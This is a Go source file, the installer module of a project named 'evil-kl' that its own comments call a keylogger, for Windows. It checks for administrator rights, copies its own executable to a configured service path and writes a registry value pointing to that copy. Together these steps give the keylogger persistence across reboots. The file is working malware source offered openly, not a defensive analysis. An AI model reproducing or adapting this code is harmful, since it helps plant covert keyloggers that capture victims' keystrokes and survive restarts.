package installer

import (
	"fmt"
	"io"
	"os"
	"path/filepath"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/pkg/registry"
	"golang.org/x/sys/windows"
)

/*
Create <Installer> - init Installer structure
	Returns <*Installer>:
		1. object's pointer
	Args:
		1. klPath <string> - keylogger's path
		2. cfgInstaller <config.Installer> - Installer's config
*/
func (i *Installer) Create(klPath string, cfgInstaller config.Installer) *Installer {
	i = &Installer{
		lc:           "INSTALLER",
		registryInst: new(registry.Registry).Create(),
		cfgInstaller: cfgInstaller,
		klPath:       klPath,
	}

	return i
}

/*
Run <Installer> - starts the installation process
	Returns <bool>:
		1. installation status
*/
func (i *Installer) Run() bool {
	if i.isInstalled() {
		logger.InfoJ(i.lc, "Service already installed")
		return false
	}

	if !i.isRoot() {
		logger.InfoJ(i.lc, "User is not root")
		return false
	}

	if err := os.MkdirAll(filepath.Dir(i.cfgInstaller.ServicePath), os.ModePerm); err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error make service's temp's directory: ", err.Error()))
		return false
	}

	if err := os.MkdirAll(filepath.Dir(i.klPath), os.ModePerm); err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error make keylogger's temp's directory: ", err.Error()))
		return false
	}

	if err := i.copyFiles(os.Args[0], i.cfgInstaller.ServicePath); err != nil {
		return false
	}

	if err := i.registryInst.SetStringValue(i.cfgInstaller.RegPath,
		i.cfgInstaller.RegName, i.cfgInstaller.ServicePath); err != nil {
		return false
	}

	logger.InfoJ(i.lc, fmt.Sprint("Service has been installed to ", i.cfgInstaller.ServicePath))

	return true
}

// CopyFiles method clone the file
func (i *Installer) copyFiles(sourcePath string, copyPath string) error {
	srcFile, err := os.Open(sourcePath)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error opening file: ", err.Error()))
		return err
	}

	defer srcFile.Close()

	destFile, err := os.Create(copyPath)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error creating file: ", err.Error()))
		return err
	}

	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error copying file data: ", err.Error()))
		return err
	}

	if err := destFile.Sync(); err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("An error occurred while fixing the current",
			" contents of the file in stable storage: ", err.Error()))
		return err
	}

	return nil
}

/*
isInstalled <Installer> - service installation check
	Returns <bool>:
		1. Is installed
*/
func (i *Installer) isInstalled() bool {
	value, err := i.registryInst.GetStringValue(i.cfgInstaller.RegPath, i.cfgInstaller.RegName)
	if err != nil {
		return false
	}

	if value != i.cfgInstaller.ServicePath {
		return false
	}

	return true
}

/*
isRoot <Installer> - root check
	Returns <bool>:
		1. Is root
*/
func (i *Installer) isRoot() bool {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Failed to allocate and init SID: ", err.Error()))
		return false
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Failed getting the member's SID: ", err.Error()))
		return false
	}

	return member
}
